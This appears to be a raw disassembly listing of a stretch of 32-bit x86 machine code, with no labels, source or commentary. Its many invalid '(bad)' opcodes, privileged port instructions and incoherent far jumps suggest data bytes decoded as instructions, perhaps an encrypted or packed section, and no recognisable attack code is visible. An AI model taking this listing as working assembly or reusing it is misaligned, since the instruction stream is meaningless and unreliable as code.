  413e2b:	es jb  0x413de4
  413e2e:	sahf   
  413e2f:	jecxz  0x413deb
  413e31:	test   al,0x4e
  413e33:	jno    0x413df9
  413e35:	xor    esi,ecx
  413e37:	mov    bh,0x49
  413e39:	dec    edx
  413e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e3b:	imul   ebx,DWORD PTR [ebx-0x17],0x59
  413e3f:	out    0x61,eax
  413e41:	sbb    eax,0x72f7b850
  413e46:	mov    eax,ds:0x2f19b1bd
  413e4b:	test   eax,0x4076c848
  413e50:	(bad)  
  413e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e52:	xor    ah,cl
  413e54:	mov    bh,0xe6
  413e56:	out    0x41,al
  413e58:	jnp    0x413e4c
  413e5a:	sti    
  413e5b:	pop    eax
  413e5c:	jno    0x413e56
  413e5e:	xchg   ecx,eax
  413e5f:	mov    esi,0x2ec6cafa
  413e64:	sahf   
  413e65:	loope  0x413ebe
  413e67:	push   edi
  413e68:	sbb    bl,BYTE PTR [ebx-0x51]
  413e6b:	jae    0x413ee2
  413e6d:	xchg   ebp,eax
  413e6e:	pop    esp
  413e6f:	ins    BYTE PTR es:[edi],dx
  413e70:	pop    es
  413e71:	mov    ebp,0xb1c9cba4
  413e76:	sahf   
  413e77:	xchg   esp,eax
  413e78:	xor    BYTE PTR [esi-0x51],bh
  413e7b:	jns    0x413e8a
  413e7d:	jbe    0x413e88
  413e7f:	sar    BYTE PTR cs:[edx-0x73],0x47
  413e84:	retf   0xffa5
  413e87:	inc    edi
  413e88:	(bad)  [esi+0x40634512]
  413e8e:	imul   BYTE PTR [edx]
  413e90:	cmp    esp,DWORD PTR [edi+0x16d74ae5]
  413e96:	jle    0x413ef9
  413e98:	mov    ch,0xa5
  413e9a:	bound  esi,QWORD PTR [esi-0x4783b262]
  413ea0:	cld    
  413ea1:	daa    
  413ea2:	mov    ah,0x15
  413ea4:	(bad)  
  413ea5:	sub    eax,0x5eba9fef
  413eaa:	arpl   WORD PTR [edi+edx*8-0x46],dx
  413eae:	cmp    al,0x56
  413eb0:	ins    BYTE PTR es:[edi],dx
  413eb1:	in     al,dx
  413eb2:	ds dec esp
  413eb4:	outs   dx,BYTE PTR ds:[esi]
  413eb5:	pusha  
  413eb6:	out    0x3d,al
  413eb8:	mov    edx,0xccdb50d0
  413ebd:	in     eax,0xe5
  413ebf:	mov    eax,0x44783ddf
  413ec4:	dec    eax
  413ec5:	cdq    
  413ec6:	mov    eax,ds:0x1e821096
  413ecb:	retf   
  413ecc:	pop    esp
  413ecd:	(bad)  
  413ece:	call   0x7f8c486
  413ed3:	(bad)  
  413ed4:	retf   0xf92b
  413ed7:	xchg   ebp,eax
  413ed8:	pop    ebx
  413ed9:	outs   dx,DWORD PTR ds:[esi]
  413eda:	(bad)  
  413edb:	mov    ebp,0x56e4862e
  413ee0:	adc    eax,edi
  413ee2:	in     al,dx
  413ee3:	mov    al,ds:0x441e448d
  413ee8:	sub    al,0x6b
  413eea:	cmp    al,0x72
  413eec:	xchg   DWORD PTR [ebx],ebx
  413eee:	cmp    dl,BYTE PTR [edi+0x485d4bd6]
  413ef4:	inc    edx
  413ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ef6:	(bad)  [edx+0x342a00aa]
  413efc:	(bad)  
  413efd:	ror    BYTE PTR [eax-0x7c],1
  413f00:	cmp    bl,BYTE PTR [ebx+edx*8-0x57970233]
  413f07:	add    dh,BYTE PTR [eax]
  413f09:	sub    bl,bh
  413f0b:	pushf  
  413f0c:	loopne 0x413ea3
  413f0e:	mov    edi,0x91c0486e
  413f13:	jnp    0x413f88
  413f15:	popf   
  413f16:	hlt    
  413f17:	inc    esi
  413f18:	add    eax,0x4fd67c6a
  413f1d:	dec    esi
  413f1e:	add    al,0x29
  413f20:	out    0x70,eax
  413f22:	lea    ebp,[ebx]
  413f24:	and    DWORD PTR [ebp-0x59],0x848fca1a
  413f2b:	mov    eax,0x10f0945d
  413f30:	sbb    al,0x54
  413f32:	inc    eax
  413f33:	daa    
  413f34:	pusha  
  413f35:	push   es
  413f36:	rol    DWORD PTR [esi+0x43f0f7a3],1
  413f3c:	dec    ebx
  413f3d:	jne    0x413f4e
  413f3f:	ins    BYTE PTR es:[edi],dx
  413f40:	ss xchg ebx,eax
  413f42:	pmuludq mm0,mm2
  413f45:	aas    
  413f46:	xor    ebx,DWORD PTR [eax+0x7d]
  413f49:	jnp    0x413ee7
  413f4b:	mov    dl,0x5d
  413f4d:	stc    
  413f4e:	sub    bl,BYTE PTR [ebp+0x7f]
  413f51:	add    eax,0x4ecd948
  413f56:	loopne 0x413f17
  413f58:	sbb    ah,0x4a
  413f5b:	cmp    DWORD PTR [eax-0x53687d31],esp
  413f61:	lods   al,BYTE PTR ds:[esi]
  413f62:	shr    DWORD PTR ds:0xaf8dc4aa,0x58
  413f69:	xchg   ebp,eax
  413f6a:	inc    edx
  413f6b:	ins    BYTE PTR es:[edi],dx
  413f6c:	adc    eax,0x18f15279
  413f71:	cli    
  413f72:	imul   esp,ecx,0xffffffba
  413f75:	int3   
  413f76:	mov    al,0xb3
  413f78:	cmc    
  413f79:	out    0x99,eax
  413f7b:	adc    DWORD PTR [eax+0x52],esi
  413f7e:	xchg   edx,eax
  413f7f:	ss in  al,0x88
  413f82:	(bad)  
  413f83:	mov    dh,0x8a
  413f85:	arpl   WORD PTR ds:0x4ef7654b,sp
  413f8b:	add    esp,DWORD PTR [ebx]
  413f8d:	sbb    al,0x32
  413f8f:	jecxz  0x413f85
  413f91:	sbb    cl,BYTE PTR [ebx+esi*2+0x56]
  413f95:	xchg   esi,eax
  413f96:	mov    DWORD PTR [ebp+0x2fe8cd7e],esp
  413f9c:	inc    esp
  413f9d:	jmp    0xa45e8e1e
  413fa2:	xchg   esi,eax
  413fa3:	js     0x413fa3
  413fa5:	and    BYTE PTR [ebx+0x5843bfc5],dl
  413fab:	mov    bh,0xa4
  413fad:	scas   al,BYTE PTR es:[edi]
  413fae:	je     0x413fa5
  413fb0:	or     ecx,DWORD PTR ds:[esi-0x5c]
  413fb4:	(bad)  [edx+ecx*1+0x7b]
  413fb8:	mov    BYTE PTR [esi-0x6f094d0b],al
  413fbe:	xchg   ecx,eax
  413fbf:	std    
  413fc0:	inc    esi
  413fc1:	push   ecx
  413fc2:	push   0x17
  413fc4:	inc    edx
  413fc5:	add    dl,bh
  413fc7:	lods   al,BYTE PTR ds:[esi]
  413fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc9:	clc    
  413fca:	pop    edi
  413fcb:	xlat   BYTE PTR ds:[ebx]
  413fcc:	dec    ebp
  413fcd:	cmp    al,0xc8
  413fcf:	lock add eax,0x617ca882
  413fd5:	or     eax,0xf5e7006e
  413fda:	les    eax,FWORD PTR [eax]
  413fdc:	push   ss
  413fdd:	enter  0x4fcb,0x8b
  413fe1:	push   ebx
  413fe2:	imul   edi,DWORD PTR [eax-0x2f456a7a],0xffffffd2
  413fe9:	push   esp
  413fea:	adc    eax,edx
  413fec:	cmp    eax,0xa73229f9
  413ff1:	mov    ah,0x50
  413ff3:	mov    WORD PTR [ecx],fs
  413ff5:	pop    es
  413ff6:	aad    0xf
  413ff8:	sub    eax,0xac8cb82f
  413ffd:	pop    ebx
  413ffe:	mov    dh,0xcc
  414000:	mov    ah,0x88
  414002:	sti    
  414003:	jl     0x41401e
  414005:	imul   eax,DWORD PTR [ebx+0x5],0x3
  414009:	loop   0x413fd2
  41400b:	push   es
  41400c:	add    al,0x6a
  41400e:	shr    esp,0xdf
  414011:	xchg   DWORD PTR [esi+0x49],esp
  414014:	cmc    
  414015:	push   esi
  414016:	aam    0x5e
  414018:	das    
  414019:	or     al,0xd2
  41401b:	popa   
  41401c:	add    cl,BYTE PTR [esi-0x76]
  41401f:	call   0x5540:0x3537d593
  414026:	mov    ds:0xc71bf76b,eax
  41402b:	sbb    eax,DWORD PTR [esp+ebx*8]
  41402e:	push   ebx
  41402f:	jbe    0x414069
  414031:	xlat   BYTE PTR ds:[ebx]
  414032:	dec    eax
  414033:	imul   ecx,DWORD PTR [edi],0xf
  414036:	inc    ecx
  414037:	dec    ebp
  414038:	mov    eax,0xf59948eb
  41403d:	aas    
  41403e:	xor    ch,BYTE PTR [eax+esi*8-0x70d69a2]
  414045:	mov    eax,ds:0xd72b7aa3
  41404a:	ret    0x776a
  41404d:	icebp  
  41404e:	xor    ebp,DWORD PTR [esi+0x42]
  414051:	push   ebp
  414052:	sbb    cl,BYTE PTR [eax]
  414054:	sub    edx,eax
  414056:	or     BYTE PTR [eax],cl
  414058:	pop    es
  414059:	popf   
  41405a:	retf   
  41405b:	xchg   BYTE PTR [esi+esi*1],ch
  41405e:	mov    bl,0x3f
  414060:	cmp    ah,BYTE PTR [edi]
  414062:	push   es
  414063:	dec    edx
  414064:	out    0xa2,al
  414066:	xchg   esi,eax
  414067:	cmp    BYTE PTR [ecx+0x7d],al
  41406a:	ins    DWORD PTR es:[edi],dx
  41406b:	daa    
  41406c:	jmp    0x7a12:0x90ce02ca
  414073:	scas   eax,DWORD PTR es:[edi]
  414074:	add    al,0x96
  414076:	(bad)  
  414077:	push   esp
  414078:	out    0x6b,al
  41407a:	enter  0x3df5,0x6a
  41407e:	and    al,0x33
  414080:	pop    ds
  414081:	adc    BYTE PTR [edx+0x7024bd3e],0xe6
  414088:	xchg   esi,eax
  414089:	in     eax,dx
  41408a:	push   ecx
  41408b:	mov    dh,0x51
  41408d:	ret    0x2fb7
  414090:	test   eax,0xdaca1eb6
  414095:	xor    eax,0xc294aba1
  41409a:	rcr    DWORD PTR [ecx-0xc],cl
  41409d:	lock sbb DWORD PTR [ecx-0x18],ecx
  4140a1:	xchg   esp,eax
  4140a2:	mov    ds:0xad5f38a,eax
  4140a7:	jbe    0x414061
  4140a9:	dec    esi
  4140aa:	lods   al,BYTE PTR ds:[esi]
  4140ab:	pop    es
  4140ac:	cs scas al,BYTE PTR es:[edi]
  4140ae:	and    BYTE PTR [esi+0x56],al
  4140b1:	ret    0x6580
  4140b4:	sub    BYTE PTR [eax],bh
  4140b6:	jmp    0x414134
  4140b8:	enter  0xe95c,0x72
  4140bc:	sbb    BYTE PTR [esi-0x1],ah
  4140bf:	jns    0x414083
  4140c1:	daa    
  4140c2:	(bad)  
  4140c3:	adc    dl,BYTE PTR ds:0x4bfa5d4a
  4140c9:	out    dx,eax
  4140ca:	cmp    dh,BYTE PTR [ecx]
  4140cc:	pushf  
  4140cd:	sbb    BYTE PTR [esi-0x34a2b5b9],dl
  4140d3:	mov    ebp,0xc89ca3de
  4140d8:	aam    0x46
  4140da:	aas    
  4140db:	xchg   dh,dl
  4140dd:	and    al,0xd0
  4140df:	lock push es
  4140e1:	loope  0x41407d
  4140e3:	cmc    
  4140e4:	aam    0x9d
  4140e6:	std    
  4140e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140e8:	and    eax,0xe076eee8
  4140ed:	fdivr  st,st(5)
  4140ef:	enter  0x758e,0x8f
  4140f3:	clc    
  4140f4:	or     al,BYTE PTR [ecx-0x7d]
  4140f7:	fld    QWORD PTR [bx+di]
  4140fa:	test   al,0x2f
  4140fc:	mov    bh,BYTE PTR [edi-0x529c0ea3]
  414102:	mov    ds:0x1b0f3f7d,al
  414107:	pop    edx
  414108:	mov    ds,WORD PTR [ebx+0x6a]
  41410b:	cwde   
  41410c:	(bad)  
  41410e:	or     ebp,DWORD PTR [eax-0x47c693e7]
  414114:	lds    eax,FWORD PTR [ecx+0x40130ce6]
  41411a:	nop
  41411b:	stos   BYTE PTR es:[edi],al
  41411c:	dec    ecx
  41411d:	add    esp,DWORD PTR [edx-0x2f]
  414120:	sbb    edx,DWORD PTR [edi+0x45]
  414123:	xchg   ebp,eax
  414124:	out    0xf1,eax
  414126:	stc    
  414127:	stos   DWORD PTR es:[edi],eax
  414128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414129:	cdq    
  41412a:	loope  0x41418c
  41412c:	sbb    al,0x2d
  41412e:	push   ss
  41412f:	mov    al,dl
  414131:	fsub   st(0),st
  414133:	popa   
  414134:	cmp    BYTE PTR [edi],ah
  414136:	int    0xbb
  414138:	fs jp  0x41416d
  41413b:	stc    
  41413c:	jecxz  0x4141a0
  41413e:	shl    ch,1
  414140:	jge    0x414107
  414142:	or     al,0x5
  414144:	je     0x4141ae
  414146:	pushf  
  414147:	mov    eax,0xe486e1ab
  41414c:	sti    
  41414d:	sar    DWORD PTR [edi],0xb5
  414150:	xor    edx,DWORD PTR [ebx-0x2]
  414153:	pop    edx
  414154:	inc    eax
  414155:	push   eax
  414156:	pop    ebp
  414157:	sbb    eax,esp
  414159:	retf   
  41415a:	push   ebx
  41415b:	xor    al,bh
  41415d:	xchg   ebp,eax
  41415e:	jmp    0x414139
  414160:	repz dec ebp
  414162:	aad    0x91
  414164:	adc    al,BYTE PTR [ebx+0x20]
  414167:	fidivr DWORD PTR [ebp+0x3b]
  41416a:	mov    ebp,0x621a43a2
  41416f:	or     eax,0xf1eadf28
  414174:	fist   WORD PTR [edx-0x6]
  414177:	addr16 cmc 
  414179:	retf   
  41417a:	jp     0x41417e
  41417c:	(bad)  
  41417d:	xchg   ebx,eax
  41417e:	cmp    dh,ch
  414180:	mov    ecx,0x7e24296b
  414185:	inc    esp
  414186:	push   edx
  414187:	push   cs
  414188:	(bad)  
  414189:	xchg   edx,eax
  41418a:	push   0xe51c95d3
  41418f:	fs pop es
  414191:	fistp  DWORD PTR [ecx-0x2b]
  414194:	jno    0x414182
  414196:	sub    dh,bh
  414198:	ficomp DWORD PTR gs:[edx-0x3f]
  41419c:	xchg   edx,eax
  41419d:	pop    ebp
  41419e:	popa   
  41419f:	sub    eax,0x54821617
  4141a4:	mov    edx,0x15b56920
  4141a9:	sti    
  4141aa:	neg    DWORD PTR [ecx+0x1cb06ccb]
  4141b0:	add    cl,BYTE PTR [edi]
  4141b2:	sbb    edi,DWORD PTR [ecx]
  4141b4:	sahf   
  4141b5:	ss stos BYTE PTR es:[edi],al
  4141b7:	mov    eax,0xc5ff7306
  4141bc:	and    ah,0x37
  4141bf:	repnz xchg ecx,eax
  4141c1:	sub    bl,al
  4141c3:	adc    eax,0x78f76c0
  4141c8:	or     al,0x99
  4141ca:	fucomip st,st(4)
  4141cc:	int3   
  4141cd:	inc    esp
  4141ce:	pop    esp
  4141cf:	inc    edx
  4141d0:	push   0xfcbf8c42
  4141d5:	pushf  
  4141d6:	fmul   DWORD PTR ds:0x9d01d120
  4141dc:	jns    0x4141ee
  4141de:	retf   0xd7a1
  4141e1:	ss repz lahf 
  4141e4:	pop    esi
  4141e5:	sbb    DWORD PTR [edi+edi*1-0x6c],0xffffff8a
  4141ea:	sti    
  4141eb:	clc    
  4141ec:	call   0xbb5e11d4
  4141f1:	pop    esp
  4141f2:	(bad)  
  4141f3:	xchg   edi,eax
  4141f4:	js     0x41424b
  4141f6:	and    edi,DWORD PTR [ebx-0x279ba6e]
  4141fc:	aaa    
  4141fd:	mov    ah,0x3
  4141ff:	retf   
  414200:	jmp    0x4141b9
  414202:	es pop edx
  414204:	xchg   edx,eax
  414205:	call   0x6be2:0xb393a650
  41420c:	xor    DWORD PTR [ebp+0x5165ca07],0x7916182b
  414216:	dec    ebp
  414217:	jmp    0x414227
  414219:	mov    ebx,0x21a533f8
  41421e:	mov    esi,ss
  414220:	xor    al,0xdd
  414222:	fsubr  QWORD PTR [eax-0x61]
  414225:	inc    edi
  414226:	shl    dl,0xa
  414229:	lock gs jg 0x4141b8
  41422d:	mov    esp,0xa278711c
  414232:	cmp    eax,0x849b767f
  414237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414238:	out    0xd6,eax
  41423a:	test   ebx,eax
  41423c:	cmp    dl,BYTE PTR [esi+0x124e64f3]
  414242:	je     0x4141d1
  414244:	(bad)  
  414245:	jno    0x41424a
  414247:	fistp  WORD PTR [edi]
  414249:	xchg   edx,eax
  41424a:	imul   ecx,DWORD PTR [ebp+0x1d],0x27cc651f
  414251:	cmp    eax,0x43b17d4d
  414256:	push   cs
  414257:	jbe    0x4142ba
  414259:	fsubr  QWORD PTR [ebp+0x27da3350]
  41425f:	into   
  414260:	and    BYTE PTR [ecx-0x368592a6],0xe2
  414267:	nop
  414268:	add    DWORD PTR [ecx],eax
  41426a:	repz inc ebx
  41426c:	pop    ds
  41426d:	push   ebx
  41426e:	sbb    ch,BYTE PTR [eax+0x26]
  414271:	cwde   
  414272:	push   esi
  414273:	cs loop 0x414249
  414276:	ds xor al,0xe6
  414279:	sub    eax,0x96782cdc
  41427e:	inc    eax
  41427f:	add    eax,0x518ac3e6
  414284:	xlat   BYTE PTR es:[ebx]
  414286:	push   ebp
  414287:	loop   0x4142f9
  414289:	test   eax,0xaf6857ad
  41428e:	ss inc esi
  414290:	std    
  414291:	mov    ch,BYTE PTR [edx-0x48]
  414294:	aaa    
  414295:	xchg   DWORD PTR [edi-0x1964c042],edx
  41429b:	ret    0xade0
  41429e:	mov    ch,BYTE PTR [esi+0x282ec6d1]
  4142a4:	arpl   WORD PTR [eax],bp
  4142a6:	push   ds
  4142a7:	mov    dh,0xcf
  4142a9:	or     dh,bh
  4142ab:	das    
  4142ac:	or     esp,eax
  4142ae:	inc    ecx
  4142af:	popf   
  4142b0:	cmp    eax,DWORD PTR [ecx]
  4142b2:	mov    bh,0x9a
  4142b4:	enterw 0xbd2b,0x9a
  4142b9:	cmp    al,0xa7
  4142bb:	push   ds
  4142bc:	mov    bl,0x97
  4142be:	aad    0x2b
  4142c0:	fwait
  4142c1:	lock stos DWORD PTR es:[edi],eax
  4142c3:	push   0x51
  4142c5:	xchg   esi,eax
  4142c6:	adc    BYTE PTR [ecx+0x35ae9add],cl
  4142cc:	leave  
  4142cd:	cld    
  4142ce:	outs   dx,DWORD PTR ds:[esi]
  4142cf:	adc    al,0x83
  4142d1:	sbb    ah,BYTE PTR [edx+0x32]
  4142d4:	pop    ss
  4142d5:	xchg   ebp,eax
  4142d6:	inc    esp
  4142d7:	out    0xb8,eax
  4142d9:	icebp  
  4142da:	xchg   ah,dl
  4142dc:	dec    DWORD PTR [esi-0x7d14f026]
  4142e2:	push   ds
  4142e3:	push   esp
  4142e4:	jle    0x4142a8
  4142e6:	jmp    0x6bf9294a
  4142eb:	sbb    edx,DWORD PTR [edx]
  4142ed:	push   edi
  4142ee:	sub    ecx,DWORD PTR [edx+0x79a72520]
  4142f4:	aaa    
  4142f5:	inc    edi
  4142f6:	xchg   al,dl
  4142f8:	mov    esi,DWORD PTR [ebx-0x3f]
  4142fb:	fmul   st(3),st
  4142fd:	or     al,0x20
  4142ff:	xor    al,0x42
  414301:	jne    0x4142e5
  414303:	pop    es
  414304:	xchg   esi,eax
  414305:	mov    ds:0x37b02767,al
  41430a:	sub    edi,esp
  41430c:	and    dl,BYTE PTR [eax]
  41430e:	jbe    0x4142c4
  414310:	mov    edx,DWORD PTR [edi]
  414312:	out    0x99,eax
  414314:	shr    BYTE PTR [ecx],1
  414316:	inc    esi
  414317:	sbb    eax,0x770ce549
  41431c:	or     eax,eax
  41431e:	bound  ebp,QWORD PTR [ecx+0x4c]
  414321:	je     0x414347
  414323:	jmp    0x7d14c3ef
  414328:	inc    esp
  414329:	and    al,0xb9
  41432b:	pop    ebp
  41432c:	inc    esp
  41432d:	dec    ebx
  41432e:	(bad)  [ebx+edi*4+0x6b]
  414332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414333:	outs   dx,DWORD PTR ds:[esi]
  414334:	and    al,0xfb
  414336:	fimul  DWORD PTR [ecx-0x41cf2392]
  41433c:	push   esp
  41433d:	add    al,0xe4
  41433f:	add    al,0x7f
  414341:	pop    esi
  414342:	pusha  
  414343:	sar    BYTE PTR [eax-0x26b765f9],1
  414349:	dec    eax
  41434a:	dec    esp
  41434b:	sub    DWORD PTR [eax+0x32],eax
  41434e:	mov    bh,0x21
  414350:	stc    
  414351:	dec    eax
  414352:	inc    ebp
  414353:	xor    BYTE PTR [edx-0x3f2fe722],ch
  414359:	cmp    ecx,ebp
  41435b:	call   DWORD PTR [eax-0x4bd0f479]
  414361:	in     al,0xba
  414363:	(bad)  
  414364:	sbb    DWORD PTR [edi-0x304c718b],edx
  41436a:	inc    ebx
  41436b:	cli    
  41436c:	cmp    ebp,DWORD PTR [ebx]
  41436e:	stos   BYTE PTR es:[edi],al
  41436f:	leave  
  414370:	dec    ecx
  414371:	(bad)  
  414372:	cdq    
  414373:	mov    dl,0x18
  414375:	repnz push ebp
  414377:	shr    BYTE PTR ds:0x1427e093,0x6a
  41437e:	into   
  41437f:	jmp    edi
  414381:	ins    DWORD PTR es:[edi],dx
  414382:	push   cs
  414383:	mov    ebp,0xa3cb1c49
  414388:	sub    eax,0x23648e6b
  41438d:	dec    edi
  41438e:	pop    eax
  41438f:	enter  0x6d38,0x12
  414393:	pop    ss
  414394:	xchg   edi,eax
  414395:	and    bh,bl
  414397:	in     eax,0x4e
  414399:	lea    eax,[ecx+0x76]
  41439c:	jb     0x414400
  41439e:	add    ebp,DWORD PTR [ebx+0x76]
  4143a1:	popf   
  4143a2:	dec    esp
  4143a3:	test   eax,0x8dd62751
  4143a8:	outs   dx,BYTE PTR ds:[esi]
  4143a9:	and    al,0x61
  4143ab:	mov    dl,0x33
  4143ad:	push   edx
  4143ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143af:	dec    eax
  4143b0:	pop    ecx
  4143b1:	sbb    BYTE PTR [esi],al
  4143b3:	push   ebp
  4143b4:	dec    ebx
  4143b5:	pop    esp
  4143b6:	ja     0x414386
  4143b8:	mov    ecx,0x1d1b68cb
  4143bd:	inc    esi
  4143be:	jecxz  0x414423
  4143c0:	sbb    edx,DWORD PTR [esi+0x1507b773]
  4143c6:	pushf  
  4143c7:	repz sbb eax,0x14e42723
  4143cd:	hlt    
  4143ce:	or     BYTE PTR [esi+esi*2],al
  4143d1:	and    DWORD PTR [ebx+0x4],ebx
  4143d4:	xchg   esp,eax
  4143d5:	push   ecx
  4143d6:	push   ss
  4143d7:	push   esp
  4143d8:	mov    ch,ah
  4143da:	adc    DWORD PTR [eax-0x2693113],ecx
  4143e0:	pushf  
  4143e1:	dec    ebx
  4143e2:	out    dx,al
  4143e3:	cs arpl bx,sp
  4143e6:	mov    edx,DWORD PTR [ebx-0x37]
  4143e9:	mov    cl,0xce
  4143eb:	push   DWORD PTR [ecx+ecx*8]
  4143ee:	in     al,0xcf
  4143f0:	mov    WORD PTR [edi],fs
  4143f2:	sub    BYTE PTR [ecx+0x6c6385fa],cl
  4143f8:	ss push 0x1f61cfbf
  4143fe:	sbb    al,0x91
  414400:	in     eax,dx
  414401:	xchg   esp,eax
  414402:	inc    esp
  414403:	dec    ecx
  414404:	mov    cl,0x5d
  414406:	pop    ecx
  414407:	lea    ecx,[edi]
  414409:	lea    ebp,[esi+0xf]
  41440c:	push   edi
  41440d:	or     DWORD PTR [esi+eiz*4+0x5401ebd2],ebp
  414414:	loop   0x414456
  414416:	icebp  
  414417:	fimul  WORD PTR [edx]
  414419:	sub    ch,BYTE PTR [ebp+0x4afd867c]
  41441f:	inc    ecx
  414420:	xor    ebp,DWORD PTR [edi]
  414422:	pop    ecx
  414423:	in     eax,dx
  414424:	cli    
  414425:	call   0xd416:0xad22a869
  41442c:	shr    DWORD PTR [edi],1
  41442e:	aas    
  41442f:	or     al,0xf6
  414431:	xor    eax,esp
  414433:	push   esi
  414434:	jb     0x414433
  414436:	or     ebx,edi
  414438:	xchg   ebx,eax
  414439:	mov    WORD PTR [ecx-0x73],es
  41443c:	xor    esi,ecx
  41443e:	bound  edx,QWORD PTR [edi-0x7f]
  414441:	xchg   ebx,eax
  414442:	add    edi,DWORD PTR [ebx]
  414444:	jns    0x414424
  414446:	bound  edx,QWORD PTR ds:0xc9263a20
  41444c:	lock call 0xb82ec06f
  414452:	mov    bl,0x3
  414454:	test   BYTE PTR [eax],bl
  414456:	ret    0xc136
  414459:	dec    ebx
  41445a:	xchg   ebp,eax
  41445b:	addr16 sbb al,0xa8
  41445e:	idiv   DWORD PTR [ecx+0x6c]
  414461:	mov    al,ds:0xfb2cafaa
  414467:	inc    edx
  414468:	(bad)  
  414469:	loopne 0x4144cb
  41446b:	fisub  DWORD PTR [eax-0x1b00e22f]
  414471:	mov    cl,0x8
  414473:	jmp    0x414445
  414475:	retf   0xa9ca
  414478:	das    
  414479:	hlt    
  41447a:	mov    BYTE PTR [ebp+0x6b36bbb3],al
  414480:	test   al,0x24
  414482:	pop    ss
  414483:	mov    al,BYTE PTR [esi]
  414485:	aad    0x82
  414487:	ficomp DWORD PTR ss:[esi+esi*1+0x60abab59]
  41448f:	sahf   
  414490:	iret   
  414491:	pop    edx
  414492:	xchg   DWORD PTR [ebp-0x57],ebp
  414495:	aam    0x48
  414497:	mov    ds:0x7b648476,eax
  41449c:	push   edx
  41449d:	sbb    dl,dh
  41449f:	inc    edi
  4144a0:	adc    BYTE PTR [esi-0x15],ah
  4144a3:	mov    ds:0x45f7987,eax
  4144a8:	and    dh,BYTE PTR [ecx]
  4144aa:	mov    ecx,0x505d6ae1
  4144af:	test   eax,0x35f65509
  4144b5:	cld    
  4144b6:	mov    al,0xd9
  4144b8:	outs   dx,BYTE PTR ds:[esi]
  4144b9:	dec    eax
  4144ba:	ret    
  4144bb:	or     eax,0x51773ebe
  4144c0:	aam    0xde
  4144c2:	lock or eax,0xfd647221
  4144c8:	sub    dl,BYTE PTR ds:0xd3b7cc86
  4144ce:	cmp    DWORD PTR [eax],0x486d3737
  4144d4:	mov    ah,0x21
  4144d6:	pop    ebx
  4144d7:	mov    bh,cl
  4144d9:	sub    al,0x63
  4144db:	fabs   
  4144dd:	mov    edx,0xab81e19a
  4144e2:	call   0xeb0:0x70be5362
  4144e9:	pop    edx
  4144ea:	push   0xfffffffd
  4144ec:	cwde   
  4144ed:	sub    BYTE PTR [edi+0x21],ah
  4144f0:	test   al,0xe8
  4144f2:	or     DWORD PTR ds:0x17a31e81,edi
  4144f8:	fsub   DWORD PTR [esi-0x36ea73c]
  4144fe:	std    
  4144ff:	push   0x7a
  414501:	mov    bl,0xcc
  414503:	sbb    eax,0x2a988157
  414508:	and    ebx,ebx
  41450a:	mov    esp,0xa89ada0d
  41450f:	mov    ebx,0x3d15881
  414514:	inc    ecx
  414515:	es adc al,cl
  414518:	push   ecx
  414519:	loopne 0x414570
  41451b:	sbb    ebp,DWORD PTR [esi]
  41451d:	add    cl,BYTE PTR [esi+0x54b8b525]
  414523:	ret    
  414524:	cmc    
  414525:	cmp    eax,0x8fd6837e
  41452a:	(bad)  
  41452b:	jnp    0x414512
  41452d:	add    dl,BYTE PTR [edx+edx*1]
  414530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414531:	stc    
  414532:	clc    
  414533:	adc    al,0x71
  414535:	cld    
  414536:	rcr    BYTE PTR ss:0x9ec05328,cl
  41453d:	in     al,0x6d
  41453f:	or     ebx,DWORD PTR [esp+esi*8-0x6afb7807]
  414546:	sahf   
  414547:	test   BYTE PTR [esi-0x2ca2df90],al
  41454d:	push   0xffffffc5
  41454f:	dec    ecx
  414550:	test   ecx,esp
  414552:	jnp    0x4145c6
  414554:	mov    edi,DWORD PTR [ebp-0x48]
  414557:	data16 jl 0x4145d8
  41455a:	dec    esi
  41455b:	fstp   TBYTE PTR [edx-0x4319cda3]
  414561:	fucom  st(0)
  414563:	cmp    DWORD PTR [ecx+eax*2-0x1dec06c0],ebp
  41456a:	cmp    BYTE PTR [ebp+0x30],0x27
  41456e:	shl    DWORD PTR [ebx],0xb1
  414571:	icebp  
  414572:	and    ecx,DWORD PTR [ebx]
  414574:	inc    esi
  414575:	cdq    
  414576:	call   0xb760138
  41457b:	adc    al,0x6e
  41457d:	inc    edi
  41457e:	scas   al,BYTE PTR es:[edi]
  41457f:	int3   
  414580:	mov    DWORD PTR [esp+ebp*8+0x2f3b0fe5],edx
  414587:	push   ebp
  414588:	cli    
  414589:	sbb    bh,BYTE PTR [eax-0x4f66d044]
  41458f:	out    0x65,al
  414591:	adc    BYTE PTR fs:[edx],ch
  414594:	sbb    edi,DWORD PTR [ecx]
  414596:	xchg   BYTE PTR [eax+0x4a160ad9],ch
  41459c:	adc    al,0x84
  41459e:	adc    dl,al
  4145a0:	sub    al,0xf0
  4145a2:	mov    ebp,0xd74f4079
  4145a7:	cs cs mov eax,0x700dd0ec
  4145ae:	add    BYTE PTR [ebx],bl
  4145b0:	jp     0x4145b9
  4145b2:	dec    ebx
  4145b3:	or     eax,0xb5209761
  4145b8:	add    al,BYTE PTR [edi+0x5c83078d]
  4145be:	in     al,dx
  4145bf:	push   esp
  4145c0:	addr16 data16 mov al,ds:0xf703
  4145c5:	and    BYTE PTR [ebx],dh
  4145c7:	sbb    DWORD PTR [esi],0xf298b456
  4145cd:	mov    ah,ch
  4145cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145d0:	pop    ebx
  4145d1:	imul   ebx,DWORD PTR [esi+edx*4-0x542945c4],0x8d8347fd
  4145dc:	or     esp,DWORD PTR [eax]
  4145de:	xchg   esp,eax
  4145df:	and    BYTE PTR [esi+0x4b20017f],bh
  4145e5:	and    BYTE PTR [edi-0x75],ch
  4145e8:	xchg   ebx,eax
  4145e9:	lods   al,BYTE PTR ds:[esi]
  4145ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145eb:	aaa    
  4145ec:	jno    0x41463e
  4145ee:	int    0xd4
  4145f0:	scas   al,BYTE PTR es:[edi]
  4145f1:	sub    BYTE PTR [ebp-0x3b],bl
